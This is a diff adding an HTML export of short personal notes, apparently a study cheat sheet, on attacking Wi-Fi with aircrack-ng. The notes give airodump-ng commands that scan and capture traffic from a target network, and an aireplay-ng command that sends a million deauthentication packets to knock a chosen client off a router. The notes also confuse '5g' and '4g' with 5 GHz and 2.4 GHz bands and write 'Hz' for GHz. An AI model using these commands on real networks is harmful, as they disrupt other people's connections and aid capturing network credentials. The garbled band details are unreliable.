@@ -1,0 +1,32 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="author" content="MarkdownViewer++" />
+        <title>Using aircrack-ng.md</title>
+        <style type="text/css">
+            
+/* Avoid page breaks inside the most common attributes, especially for exports (i.e. PDF) */
+td, h1, h2, h3, h4, h5, p, ul, ol, li {
+    page-break-inside: avoid; 
+}
+
+        </style>
+      </head>
+    <body>
+        <p><a href="..">Back</a></p>
+<p>after activating monitor mode<br />
+airodump-ng --band abg <wireless adaptor in mon mode> will search for all 5g and 4g networks<br />
+airodump-ng wlan0 for only 4g or 2.4Hz networks<br />
+airodump-ng --band a <wireless adaptor in mon mode> for 5g or 5Hz networks<br />
+airodump-ng --bssid <bssid of target> --channel <channel no> --write &lt;name/location of file to write on&gt; <wireless mon mode> to start collecting data<br />
+^c to stop<br />
+wireshark to elaborate the cap file on opening</p>
+<p>aireplay-ng --deauth 1000000 -a <router mac> -c <client mac> <adapter in mon> will start deauth attacks <br />
+client mac can be any one of the several clients connected to the router we targeted.</p>
+<p><a href="..">Back</a></p>
+
+    </body>
+</html>
+            
